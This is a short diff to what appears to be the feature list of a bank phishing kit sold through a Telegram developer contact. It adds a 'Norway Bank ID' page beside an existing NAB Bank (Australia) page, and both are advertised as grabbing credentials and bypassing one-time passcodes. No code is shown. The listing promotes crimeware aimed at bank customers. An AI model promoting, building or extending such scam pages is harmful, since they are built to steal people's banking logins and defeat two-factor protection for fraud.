@@ -24,6 +24,10 @@ developer: https://t.me/pysmart
 # NAB BANK - AU 
 -  grabs credentials
 -  - OTP bypass
+ 
+# NORWAY BANK ID
+- grabs credentials
+- 0TP bypass
 
 
 #  OTHER BANK SCAMPAGES 
